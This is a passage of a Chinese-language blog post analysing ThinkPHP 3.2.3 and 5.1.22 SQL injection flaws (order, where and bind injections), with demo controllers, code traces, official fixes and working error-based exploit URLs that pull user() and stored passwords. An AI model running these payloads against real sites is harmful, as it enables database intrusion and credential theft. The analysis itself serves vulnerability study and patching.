+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/7.png" alt></p>
+<p>（本意应该是生成一个<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`user`</span> (<span class="symbol">`username`</span>) <span class="keyword">VALUES</span> ( username+<span class="number">1</span> )</span><br></pre></td></tr></table></figure></p>
+<p>这类似的语句</p>
+<p>但是这里没有对拼接的参数进行验证，导致恶意sql语句被拼接，从而引发sql注入</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/8.png" alt></p>
+<p>除了<code>insert</code>方法还有<code>update</code>也能触发该漏洞</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方给出的修复方式是连接前对<code>$val[1]</code>进行一次判断</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/9.png" alt></p>
+<p>只有当<code>$val[1]==$key</code>键值时才能进行拼接（那万一要执行<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`user`</span> (<span class="symbol">`age`</span>) <span class="keyword">VALUES</span> ( oldage+<span class="number">1</span> )</span><br></pre></td></tr></table></figure></p>
+<p>呢？</p>
+<h1 id="ThinkPHP-5-1-22-order-by-注入"><a href="#ThinkPHP-5-1-22-order-by-注入" class="headerlink" title="ThinkPHP 5.1.22 order by 注入"></a>ThinkPHP 5.1.22 order by 注入</h1><p>同时受到影响的还有3.2.3及以下的版本，这里仅以5.1.22进行分析</p>
+<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载好对应版本的ThinkPHP之后，创建一个demo页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data=<span class="keyword">array</span>();</span><br><span class="line">    $data[<span class="string">'username'</span>]=<span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'admin'</span>);</span><br><span class="line">    $order=input(<span class="string">'get.order'</span>);</span><br><span class="line">    $m=db(<span class="string">'user'</span>)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">    dump($m);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>数据库</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/10.png" alt></p>
+<p>设置好对应的数据库配置，以及开启<code>debug</code>模式</p>
+<p>访问如下url即可产生注入</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost/tp5.1.22/public/?order</span>[<span class="string">id`|updatexml(1,concat(0x3a,user()),1)%23</span>]=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/11.png" alt></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在数据库处理的地方下好断点，跟入数据库的操作，可以来到<code>order</code>函数中（<code>thinkphp\library\think\db\Query.php:1823</code>）</p>
+<p>有很多代码区域都没有进入，所以只贴上相关的代码</p>
+<p>动态调试中，就主要经过了这几个点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">order</span><span class="params">($field, $order = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	....</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'order'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'order'</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($field)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'order'</span>] = array_merge(<span class="keyword">$this</span>-&gt;options[<span class="string">'order'</span>], $field);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/12.png" alt></p>
+<p>可以看到，当<code>$field</code>是一个数组的时候，直接用<code>array_merge</code>进行了数组拼接，没有进行任何过滤</p>
+<p>所以导致键名直接拼接到了语句中，从而在预编译阶段报错</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/13.png" alt></p>
+<p>最后还是和其他SQL注入类似，由于PDO的原因，导致无法进行子查询</p>
+<h1 id="ThinkPHP-3-2-3-where注入"><a href="#ThinkPHP-3-2-3-where注入" class="headerlink" title="ThinkPHP 3.2.3 where注入"></a>ThinkPHP 3.2.3 where注入</h1><p>终于找到一个支持子查询的SQL注入了，估摸着应该是3和5版本的区别（感觉tp5中的注入都是蛮鸡肋的，但思路值得学习</p>
+<h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载<code>3.2.3</code>版本的ThinkPHP，在<code>IndexController.class.php</code>中创建一个demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = M(<span class="string">'user'</span>)-&gt;find(I(<span class="string">'GET.id'</span>));</span><br><span class="line">    var_dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建好<code>user</code>表以及<code>id</code>、<code>username</code>、<code>password</code>字段，然后配置好<code>config.php</code>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">	<span class="comment">//'配置项'=&gt;'配置值'</span></span><br><span class="line">	<span class="string">'DB_TYPE'</span>			=&gt;	<span class="string">'mysql'</span>,</span><br><span class="line">	<span class="string">'DB_HOST'</span>			=&gt;	<span class="string">'localhost'</span>,</span><br><span class="line">	<span class="string">'DB_NAME'</span>			=&gt;	<span class="string">'tp5'</span>,</span><br><span class="line">	<span class="string">'DB_USER'</span>			=&gt;	<span class="string">'root'</span>,</span><br><span class="line">	<span class="string">'DB_PWD'</span>			=&gt;	<span class="string">''</span>,</span><br><span class="line">	<span class="string">'DB_PORT'</span>			=&gt;	<span class="string">'3306'</span>,</span><br><span class="line">	<span class="string">'DB_FIELDS_CACHE'</span> 	=&gt;	<span class="keyword">true</span>,</span><br><span class="line">	<span class="string">'SHOW_PAGE_TRACE'</span> 	=&gt;	<span class="keyword">true</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://localhost/tp3.2.3/index.php?id=1</code>就可以看到数据被取出</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/14.png" alt></p>
+<p>然后访问如下url即可产生注入</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost/tp3.2.3/index.php?id</span>[<span class="string">where</span>]=3 and 1=updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/15.png" alt></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过payload可以看到还是利用数组的形式进行传参，从而造成了sql注入，感觉一般都是在数组这层，对数据的过滤不够严谨，导致的字符串拼接，从而sql注入</p>
+<p>在<code>$data = M(&#39;user&#39;)-&gt;find(I(&#39;GET.id&#39;));</code>中下好断点，跟踪到<code>ThinkPHP/Library/Think/Model.class.php:720</code>的<code>select</code>函数中</p>
+<p>只列出两条比较重要的语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">	....</span><br><span class="line">    <span class="comment">// 分析表达式</span></span><br><span class="line">    $options            =   <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">	....</span><br><span class="line">    $resultSet          =   <span class="keyword">$this</span>-&gt;db-&gt;select($options);</span><br><span class="line">	.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在一开始的<code>$this-&gt;_parseOptions($options);</code>中，本来是对传入的pk进行了类型转换，导致无法进行sql注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">	....</span><br><span class="line">    <span class="comment">// 字段类型验证</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($options[<span class="string">'where'</span>]) &amp;&amp; is_array($options[<span class="string">'where'</span>]) &amp;&amp; !<span class="keyword">empty</span>($fields) &amp;&amp; !<span class="keyword">isset</span>($options[<span class="string">'join'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">        <span class="keyword">foreach</span> ($options[<span class="string">'where'</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">            $key            =   trim($key);</span><br><span class="line">            <span class="keyword">if</span>(in_array($key,$fields,<span class="keyword">true</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_scalar($val)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_parseType($options[<span class="string">'where'</span>],$key);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(!is_numeric($key) &amp;&amp; <span class="string">'_'</span> != substr($key,<span class="number">0</span>,<span class="number">1</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key,<span class="string">'.'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key,<span class="string">'('</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key,<span class="string">'|'</span>) &amp;&amp; <span class="keyword">false</span> === strpos($key,<span class="string">'&amp;'</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'strict'</span>]))&#123;</span><br><span class="line">                    E(L(<span class="string">'_ERROR_QUERY_EXPRESS_'</span>).<span class="string">':['</span>.$key.<span class="string">'=&gt;'</span>.$val.<span class="string">']'</span>);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">unset</span>($options[<span class="string">'where'</span>][$key]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是由于传入的是数组的原因，导致略过了类型转换部分，从而将恶意语句带入了下文中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/16.png" alt></p>
+<p>然后最后被带入到<code>$this-&gt;db-&gt;select($options);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>());</span><br><span class="line">    $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">    $result   = <span class="keyword">$this</span>-&gt;query($sql,!<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟入到<code>$sql    = $this-&gt;buildSelectSql($options);</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($options[<span class="string">'page'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 根据页数计算limit</span></span><br><span class="line">        <span class="keyword">list</span>($page,$listRows)   =   $options[<span class="string">'page'</span>];</span><br><span class="line">        $page    =  $page&gt;<span class="number">0</span> ? $page : <span class="number">1</span>;</span><br><span class="line">        $listRows=  $listRows&gt;<span class="number">0</span> ? $listRows : (is_numeric($options[<span class="string">'limit'</span>])?$options[<span class="string">'limit'</span>]:<span class="number">20</span>);</span><br><span class="line">        $offset  =  $listRows*($page<span class="number">-1</span>);</span><br><span class="line">        $options[<span class="string">'limit'</span>] =  $offset.<span class="string">','</span>.$listRows;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql  =   <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql,$options);</span><br><span class="line">    <span class="keyword">return</span> $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再到<code>$sql  =   $this-&gt;parseSql($this-&gt;selectSql,$options);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql,$options=array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line">    $sql   = str_replace(</span><br><span class="line">        <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>,<span class="string">'%DISTINCT%'</span>,<span class="string">'%FIELD%'</span>,<span class="string">'%JOIN%'</span>,<span class="string">'%WHERE%'</span>,<span class="string">'%GROUP%'</span>,<span class="string">'%HAVING%'</span>,<span class="string">'%ORDER%'</span>,<span class="string">'%LIMIT%'</span>,<span class="string">'%UNION%'</span>,<span class="string">'%LOCK%'</span>,<span class="string">'%COMMENT%'</span>,<span class="string">'%FORCE%'</span>),</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>])?$options[<span class="string">'distinct'</span>]:<span class="keyword">false</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>])?$options[<span class="string">'field'</span>]:<span class="string">'*'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>])?$options[<span class="string">'join'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>])?$options[<span class="string">'where'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>])?$options[<span class="string">'group'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>])?$options[<span class="string">'having'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>])?$options[<span class="string">'limit'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>])?$options[<span class="string">'union'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>])?$options[<span class="string">'lock'</span>]:<span class="keyword">false</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>])?$options[<span class="string">'comment'</span>]:<span class="string">''</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>])?$options[<span class="string">'force'</span>]:<span class="string">''</span>)</span><br><span class="line">        ),$sql);</span><br><span class="line">    <span class="keyword">return</span> $sql;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到是将<code>option</code>中的字段字节直接在sql语句中进行了拼接，而且从这也能看出，不仅仅有<code>where</code>还有以些<code>tables</code>、<code>field</code>之类的字段都可以控制，因为也会被直接拼接到语句中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/17.png" alt></p>
+<p>然后语句被执行，引发了报错注入</p>
+<p>该漏洞涉及到<code>select</code>、<code>find</code>、<code>delete</code>等方法</p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/19.png" alt></p>
+<p>新的版本中将<code>$options</code>和<code>$this-&gt;options</code>进行了区分，从而传入的参数无法污染到<code>$this-&gt;options</code>，也就无法控制sql语句了。</p>
+<h1 id="ThinkPHP-3-2-3-bind-注入"><a href="#ThinkPHP-3-2-3-bind-注入" class="headerlink" title="ThinkPHP 3.2.3 bind 注入"></a>ThinkPHP 3.2.3 bind 注入</h1><h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>demo页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"user"</span>);</span><br><span class="line">    $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">    $data[<span class="string">'username'</span>] = I(<span class="string">'username'</span>);</span><br><span class="line">    $data[<span class="string">'password'</span>] = I(<span class="string">'password'</span>);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还有数据库和<code>config.php</code>配置一下</p>
+<p>访问<code>http://localhost/tp3.2.3/index.php?username=admin&amp;password=123&amp;id=1</code>看到</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/20.png" alt></p>
+<p>就表示成功<code>update</code>了一条语句，然后访问</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp3.2.3/<span class="keyword">index</span>.php</span><br><span class="line">?username=admin</span><br><span class="line">&amp;<span class="keyword">password</span>=<span class="number">123</span></span><br><span class="line">&amp;id[]=bind</span><br><span class="line">&amp;id[]=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/21.png" alt></p>
+<p>即可看到报错</p>
+<h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的重点就在于参数中的<code>id[]=bind</code>，我们只要跟踪由于这个引起的变化，就能看到漏洞触发的全过程。</p>
+<p>来到<code>ThinkPHP/Library/Think/Model.class.php:396</code> save函数中（很多代码无用被缩了起来</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/26.png" alt></p>
+<p>获取了表名字段名一些准备工作之后会进入<code>$this-&gt;db-&gt;update($data,$options);</code></p>
+<p>最后会来到<code>parseWhere</code>的解析</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/27.png" alt></p>
+<p>到目前位置传入的<code>options</code>中的<code>where</code>条件依旧是传入的数组</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/28.png" alt></p>
+<p>漏洞重点在于<code>ThinkPHP/Library/Think/Db/Driver.class.php:547</code>中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/22.png" alt></p>
+<p>当<code>&#39;bind&#39;==$exp</code>的时候，就会直接将key和value拼接到where表达式中（本意应该只是生成占位符</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/23.png" alt></p>
+<p>导致最后sql语句变为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="string">`user`</span> <span class="keyword">SET</span> <span class="string">`username`</span>=:<span class="number">0</span>,<span class="string">`password`</span>=:<span class="number">1</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> = :<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>在最后<code>execute</code>时，就只会替换<code>:1</code>部分的数据</p>
+<p><code>ThinkPHP/Library/Think/Db/Driver.class.php:196</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($str,$fetchSql=false)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;initConnect(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">$this</span>-&gt;_linkID ) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;queryStr = $str;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">        $that   =   <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span><span class="params">($val)</span> <span class="title">use</span><span class="params">($that)</span></span>&#123; <span class="keyword">return</span> <span class="string">'\''</span>.$that-&gt;escapeString($val).<span class="string">'\''</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/25.png" alt></p>
+<p>导致后面的<code>and updatexml(1,concat(0x7,(select password from user limit 1),0x7e),1)</code>语句逃逸，从而产生SQL注入</p>
+<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复方案只是在<code>I</code>函数的过滤器上加入了对于<code>bind</code>的过滤</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP-漏洞分析集合/29.png" alt></p>
+<p>emmm，有点不知道怎么评论</p>
+<h1 id="Reference-Links"><a href="#Reference-Links" class="headerlink" title="Reference Links"></a>Reference Links</h1><p><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>
+<p><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p>
+<p><a href="http://www.zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">http://www.zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a></p>
+<p><a href="http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener">https://xz.aliyun.com/t/2631</a></p>
+<p><a href="https://xz.aliyun.com/t/2629#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629#toc-5</a></p>
+<p><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104847</a></p>
+
+
+                <hr>
